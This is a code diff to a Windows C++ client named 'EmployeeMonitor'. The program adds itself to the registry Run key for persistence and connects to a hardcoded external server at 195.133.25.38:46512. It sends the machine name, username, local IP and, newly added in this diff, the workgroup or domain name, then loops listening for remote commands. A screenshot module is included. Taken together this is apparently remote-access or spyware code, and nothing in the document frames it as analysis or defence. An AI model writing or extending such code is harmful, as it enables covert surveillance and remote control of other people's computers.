@@ -8,17 +8,20 @@
 #include <string>
 #include <sstream>
 #include <ctime>
+#include <Lm.h>
+#include <iostream>
+
 #include "win_screenshot.h"
 
 #pragma comment(lib, "Ws2_32.lib")
-#pragma comment(lib, "Shlwapi.lib")
+#pragma comment(lib, "Netapi32.lib")
 
-#define SERVER_IP "195.133.25.38"
-#define SERVER_PORT 46512
+constexpr auto SERVER_IP = "195.133.25.38";
+constexpr auto SERVER_PORT = 46512;
 
 using namespace std;
 
-void AddToStartup() {
+static void AddToStartup() {
     HKEY hKey;
     const char* keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
     const char* appName = "EmployeeMonitor";
@@ -40,21 +43,44 @@ void AddToStartup() {
     }
 }
 
-string GetComputerNameStr() {
+static string GetComputerNameStr() {
     char name[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD size = sizeof(name);
     if (GetComputerNameA(name, &size)) return string(name);
     return "Unknown";
 }
 
-string GetUsernameStr() {
+static string GetUsernameStr() {
     char username[UNLEN + 1];
     DWORD username_len = UNLEN + 1;
     if (GetUserNameA(username, &username_len)) return string(username);
     return "Unknown";
 }
 
-string GetLocalIP() {
+static string GetLocalDomainName() {
+    LPWKSTA_INFO_100 pBuf = nullptr;
+    NET_API_STATUS nStatus;
+    string domainName = "";
+
+    nStatus = NetWkstaGetInfo(nullptr, 100, (LPBYTE*)&pBuf);
+
+    if (nStatus == NERR_Success && pBuf != nullptr) {
+        int size_needed = WideCharToMultiByte(CP_UTF8, 0, pBuf->wki100_langroup, -1, nullptr, 0, nullptr, nullptr);
+        if (size_needed > 0) {
+            string result(size_needed, 0);
+            WideCharToMultiByte(CP_UTF8, 0, pBuf->wki100_langroup, -1, &result[0], size_needed, nullptr, nullptr);
+            domainName = result;
+        }
+        NetApiBufferFree(pBuf);
+    }
+    else {
+        domainName = "UNKNOWN";
+    }
+
+    return domainName;
+}
+
+static string GetLocalIP() {
     char host[256];
     if (gethostname(host, sizeof(host)) == SOCKET_ERROR) return "0.0.0.0";
 
@@ -73,11 +99,12 @@ string GetLocalIP() {
     return string(ip);
 }
 
-void SendClientInfo(SOCKET sock) {
+static void SendClientInfo(SOCKET sock) {
     ostringstream oss;
     oss << "INFO:" << GetComputerNameStr() << ";"
         << GetUsernameStr() << ";"
-        << GetLocalIP() << ";";
+        << GetLocalIP() << ";"
+        << GetLocalDomainName() << ";";
     string msg = oss.str();
     send(sock, msg.c_str(), msg.length(), 0);
 }
@@ -91,7 +118,7 @@ time_t GetLastUserInputTime() {
     return time(nullptr);
 }
 
-void ListenForCommands(SOCKET sock) {
+static void ListenForCommands(SOCKET sock) {
     char buffer[1024];
     while (true) {
         int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
